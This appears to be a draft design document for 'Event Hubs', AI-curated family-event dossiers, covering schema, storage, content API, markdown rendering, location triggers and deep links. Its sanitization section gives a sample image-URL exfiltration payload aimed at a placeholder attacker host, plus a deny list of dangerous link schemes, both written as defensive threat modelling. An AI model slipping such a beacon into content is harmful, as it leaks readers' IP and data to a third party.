# Event Hubs — Design (Draft)

> **Status: Draft / pre-spec (2026-06-18).** Brainstorm output feeding the
> Phase C PRD (C1) and architecture (C2). **Not gate-accepted.** Depends on
> **Proposed ADR 0006** (scope expansion) being Accepted before it becomes a
> binding spec. Authored before G2 — informs, does not authorize build.

## Concept

An **Event Hub** is one typed, AI-curated dossier for a family event —
everything in one place: info, links, documents, checklists, timeline,
contacts. Persistent (lives until the event passes, then archives). Rich and
sectioned. It is the **"Projects"** peer of the daily **"Now"** briefing.

Why it matters: validation round 1 found the daily-briefing concept
commoditized (Gemini Daily Brief / Cozi / Maple). Event Hubs are **not**
shipped by those incumbents and lean directly into the content-API /
power-user wedge — this is the candidate **defensible surface** the
validation said was missing. See `research/validation-round1-2026-06.md`.

## Two surfaces, one data model (equal peers)

- **Now (briefing):** ephemeral cards — next action, today's logistics.
  Each card **deep-links into the relevant Hub**.
- **Hub (project):** persistent dossier. Imminent Hub items (checklist due,
  countdown, milestone) **emit briefing cards** into Now.

One store, two views. The coupling is the product: Now answers "what next?",
Hub answers "everything about it." The tap from Now into the exact Hub
content is the load-bearing interaction — see **Deep-linking** below.

## Data model (JSON schema = source of truth)

```
Hub {
  id, type (from template catalog), title, status (planning|active|archived),
  dates: { start?, end?, countdownTo? }
  sections: Section[]
}
Section { id, title, order, blocks: Block[] }
Block (typed; discriminated union):
  - text        { md }                  // SHORT inline markdown (a caption / paragraph)
  - markdown    { body_md }             // LONG-FORM markdown document (lengthy files) — see §Markdown
  - link        { url, label, source }
  - checklist   { items: [{ text, done, due?, assignee? }] }
  - document    { ref: url | fileRef, label, kind }      // MVP: link + small file ref
  - milestone   { date, label }
  - contact     { name, role, phone?, email? }
  - location    { label, address?, mapUrl? }
  - budget      { items: [{ label, amount, paid? }] }     // optional, post-MVP candidate
provenance (per block): { source: "claude" | "email" | "user" | "<url>", at }
```

Schemas live in `specs/domain-model/schemas/` once this is gate-promoted
(borrowing ambient-ai's "schema wins over prose" discipline).

**Relational storage (per the auth design review — tenant-scoped, not
JSON-only):** the JSON shapes above are the *wire* format; storage is
relational and `family_id`-scoped:
```
hubs(id, family_id FK NOT NULL, type, title, status, start?, end?,
     countdown_to?, version, created_at, updated_at, deleted_at)
sections(id, hub_id FK, title, order, created_at, updated_at, deleted_at)
blocks(id, section_id FK, type, payload jsonb, body_md text, provenance jsonb,
     version, created_at, updated_at, deleted_at, UNIQUE(hub_id, id))
```
`body_md` holds long-form markdown for `text`/`markdown` blocks (kept OUT of
`payload jsonb` — large content, cleaner full-text search). `payload` carries
the structured fields of the other block types.
- **Tenant-explicit API path:** `PUT /families/{fid}/hubs/{id}` (and
  `.../sections/{sid}`, `.../blocks/{bid}`). The credential (household token
  at prototype, minted CLI credential in the product) carries the family
  scope; the server checks **scope-vs-path** — so the endpoint contract is
  identical as auth grows (protects ADR 0007's "additive without rework").
- **Idempotent upsert + concurrency:** client-supplied **stable IDs**;
  prototype = **single-writer last-write-wins**; carry a `version`/
  `updated_at` now for optimistic concurrency (`If-Match`) when a 2nd writer
  appears. **Parent-must-exist** on nested upsert (return 409/404, never
  orphan). Promote `dates` (start/end/countdownTo) to typed columns (so
  archival + countdown queries can index them). Soft-delete content
  (`deleted_at`) to honor graceful deep-link "that item moved" resolution.
- **provenance** gains `credential_id` (which CLI credential pushed the
  block) for audit.

## Markdown & long-form unstructured content

Markdown is the product's primitive for unstructured content. It is authored
externally (operator via Claude Code), passed to the **CLI**, and pushed to
the backend as a `markdown` block (or short `text` block). A whole markdown
file maps to one `markdown` block (or a Section that is one `markdown` block).

- **Flavor:** **CommonMark + GFM subset** (headings, lists, **task lists**,
  tables, fenced code, blockquotes, strikethrough, links). One documented
  flavor; the renderer and any server-side processing agree on it.
- **Lengthy files supported.** `body_md` is a `text` column (not jsonb) — no
  artificial length cap; design target up to ~1 MB markdown per block.
  Transport: accept gzip on the upsert; the tenant-explicit
  `PUT /families/{fid}/.../blocks/{bid}` carries the full body (chunked
  transfer only if a block ever exceeds the body limit — not expected).
- **Sanitization (markdown comes from a CLI / external source → untrusted).**
  The chosen renderer is **XSS-safe by structure** (native Compose, no
  WebView/HTML engine — raw `<script>`/`onerror` are inert text). The real
  residual surface is **URL-borne**, and the app MUST enforce it (the
  renderer gives control points but enforces nothing):
  - **Image-URL exfiltration is the top risk** (`![](https://attacker/x)`
    auto-fetches → leaks IP/UA/data). → images **off by default** at MVP.
  - **Allowlist link schemes** to `http`/`https`/`mailto` (block
    `javascript:`/`data:`/`file:`/`intent:`) by wrapping `LocalUriHandler`.
  - **Show the link target** before navigating; strip raw HTML on ingest too
    (defense in depth).
- **Images:** at MVP, markdown images render via the renderer's **default
  no-op image transformer (off)** — consistent with the docs scope
  (links/small refs). When enabled post-MVP, load via Coil3 with a **host
  allowlist** (or tap-to-load). No arbitrary auto-loading of remote images.
- **Links:** open **externally on tap** (calm — no surprise in-app nav),
  consistent with deep-link arrival behavior.
- **Mobile render component:** one reusable **Markdown renderer** in the M3
  Expressive system (ADR 0009) using **`mikepenz/multiplatform-markdown-
  renderer` (+ `-coil3`)** — the only maintained true Android+iOS CMP
  renderer (verified 2026). Render lengthy docs with **`LazyMarkdownSuccess`
  + off-main-thread `parseMarkdownFlow()`** (a plain `Column` is ~12× slower
  on long docs). Verify task-list + autolink rendering, and that the path
  stays WebView-free across upgrades.
- **Briefing cards** support only **limited inline markdown** (bold/italic/
  links) — they're short nudges, not documents.
- **Full-text search ready:** `tsvector` + GIN over the **raw** `body_md`
  (not rendered HTML); Meilisearch later only if typo-tolerance/relevance
  demands. Available without schema change.
- **Very large bodies (>~1–few MB):** spill `body_md` to object storage and
  keep a metadata row + key in Postgres (DB storage is ~5–20× the cost and
  hurts backups/replication). Serve raw `text/markdown`, brotli/gzip, with
  range/section pagination — not JSON-wrapped.

## Triggers & places (private on-device matching — ADR 0014)

Content carries **triggers**; the **client matches them on-device** against
the device's live location/time/activity, which **never leaves the device**.
Claude authors the trigger metadata from context; the client geofences /
schedules locally and surfaces the linked card calmly.

**Block/Card `triggers[]` (discriminated):**
```
trigger:
  - geo      { place_ref | {lat,lng}, radius_m, label? }   // proximity
  - when     { at? | window{start,end}? | relative? | recurring? , alert_offset? }
  - activity { kind: walking|running|biking|driving }       // schema slot; matching DEFERRED
```

**Family-scoped `places`** (define home/school/store once; reference by
`place_ref`). Place coords are **family content** (encrypted at rest, never
logged, never the user's live position):
```
places(id, family_id FK NOT NULL, label, lat, lng, radius_m,
       created_at, updated_at, deleted_at, PRIMARY KEY(family_id, id))
```

**Storage:** `triggers jsonb` on `blocks` and `briefing_cards` (low cardinality
per row). For the client's nearest-N/soonest-N selection within geofence
limits (iOS ~20 / Android ~100), the client derives an in-memory active set
from synced triggers; a server-side `triggers` view/table is **not** needed at
MVP (no live position server-side, by design).

**Client behavior:** on `sync` → register the nearest-N geofences + schedule
soonest-N local time-notifications → on enter/fire surface/boost the linked
card. Respect quiet hours, dedupe, daily cap (constitution). **Progressive
permission:** when-in-use → "Always" opt-in for background; time triggers use
only the notification permission. Background geo + activity = later milestone.

## Template catalog (bounded — ADR 0004 "template-catalog-bounded")

Starter Hub types, each = default sections + checklist skeleton:
`vacation`, `starting-college`, `move`, `party-event`, `new-baby`,
`medical`, `school-year`. Bounded catalog keeps curation scoped and review-
able; new types are added deliberately, not inferred open-endedly.

## Curation = push-based, external ("render, don't reason")

AI curation runs **outside** the app — Claude Code, AI loops, scheduled
tasks — and **pushes** assembled blocks to the content API. The app stores
and renders; it does not run open-ended ingestion/curation at MVP. App-side
source ingestion (auto-pull from Calendar/email) is **post-MVP** and ADR-
gated. This keeps the MVP true to the content-API wedge and the
restricted-scope/COPPA avoidance in ADR 0004/0005.

**Provenance on every block** (constitution honesty guarantee): each block
shows where it came from ("added by Claude", "from your email", "link you
saved"). The product never presents fabricated content as fact.

## Power-user authoring flow

The app **owns and stores** the rendered content (single render source of
truth). Power users may keep their **own upstream source** (git repo,
laptop notes, scraped data) and instruct Claude to push into the platform:

1. Power user maintains rich source anywhere they like.
2. Runs Claude Code with the family-ai-dashboard skill → transforms source
   into Hub/Section/Block payloads → **idempotent upsert** via the content
   API (auth token; re-push = update, never duplicate).
3. App stores + renders to every family member, including non-technical
   members who only ever see the finished page.

The app does **not** read the user's repo; the flow is push-only. Stable
block IDs + upsert semantics make re-curation safe and repeatable.

## Content API (extends the MVP content API)

- `PUT /hubs/{id}` — upsert hub (idempotent on id).
- `PUT /hubs/{id}/sections/{sid}` / `.../blocks/{bid}` — upsert section/block.
- `POST /hubs/{id}/archive` — archive after event passes.
- Auth: per-household API token (power user / loop). Rate-limited per token.
- CLI + Claude skill wrap these; payloads validate against the JSON schema.

## Deep-linking: briefing → Hub content

The load-bearing interaction: a user taps a briefing card and lands on the
**exact** Hub content it refers to — a header, checklist item, link, or
document — not just the Hub top.

**Addressing.** Every Section and Block has a stable id (upsert-stable).
A briefing card carries a `target`:

```
BriefingCard.target = { hubId, sectionId?, blockId? }
```

Cards *emitted from* a Hub item already know their origin block, so the
backlink is free; cards authored independently set the deepest target they
can resolve.

**One canonical link, all surfaces (universal / app links).**
- **Web:** `https://<app>/hubs/{hubId}#block-{blockId}` — real anchor.
- **Native (Android/iOS):** the same https URL via **Android App Links /
  iOS Universal Links** opens the app; fallback custom scheme
  `dayfold://hub/{hubId}?block={blockId}`.
- **CMP shared route:** `HubRoute(hubId, focusBlockId?)` renders the Hub,
  scrolls to the target, **transiently highlights** it, and expands its
  section.

**Graceful resolution (never dead-end).** If the target block/section is
missing (archived, deleted, not yet pushed), resolve to the nearest
ancestor (block → section → hub top) and show a quiet "that item moved"
note. A deep link never lands on an error.

**Arrival behavior = calm.** Scroll + transient highlight + expand the
section. The app does **not** auto-navigate out. For a **document block**
(MVP = link + small file ref), the deep link lands *focused on the block*;
the user taps to open the external ref. (Confirmed MVP behavior — no
auto-open, no in-app preview yet; full in-app document preview is post-MVP
and ADR-0006-revisit-gated.)

**Provenance back-link (optional, low priority).** A block may show
"surfaced in your briefing" — the inverse of the card's `target`.

## Native vs www

CMP shared composables render the same Hub data per-surface:
- **Mobile (Android/iOS):** scrollable, collapsible sectioned page; imminent
  items pinned; countdown header.
- **Web (Wasm/JS, early-adopter per CMP-Web Beta):** richer multi-column /
  board layout; same data, denser presentation.

## Documents at MVP

**Links + small file refs only.** Hubs hold URLs and lightweight file
references; no heavy upload/storage pipeline at MVP. Full document upload +
storage + a dedicated privacy/security tier is **post-MVP** (feeds C4
security model). Keeps dogfood sensitivity and cost low.

## Scope, privacy, and gate notes

- **Scope expansion → Proposed ADR 0006.** Hosting curated dossiers +
  checklists is beyond "render ephemeral briefing cards." A Hub is a
  **derived, curated dossier the app owns** — it points into the family's
  calendar/email/lists, it does **not** replace them (reconciles the
  constitution "not a system of record" line). ADR 0006 must be Accepted
  before this is a binding spec.
- **Minor access (ADR 0005, Proposed):** Hubs inherit the strictest data
  posture for 14+ minor profiles; no email-derived blocks on minor profiles.
- **Documents** raise sensitivity even as refs — privacy tiering is a C4 item.

## How this feeds the board

- **C1 PRD v0** — Event Hubs + Now briefing as co-equal surfaces.
- **C2 architecture** — content API + Hub schema + render layer.
- **A3 capability spike** — extend the content-API spike to include a Hub
  upsert round-trip from Claude Code.

## Open questions (also in `context/open-questions.md`)

- OQ-hub-archival: retention/export policy for archived Hubs.
- OQ-hub-collab: can multiple family members edit a Hub in-app, or is
  authoring push/Claude-only at MVP? (Lean: push/Claude-only at MVP, in-app
  edit post-MVP.)
- OQ-doc-storage: when do we add real document upload + its privacy tier?
- OQ-deeplink-domain: Android App Links + iOS Universal Links need a verified
  domain + association files (`assetlinks.json` / `apple-app-site-assoc`) —
  an infra prerequisite for the same https link to open the app. → C2/C3.
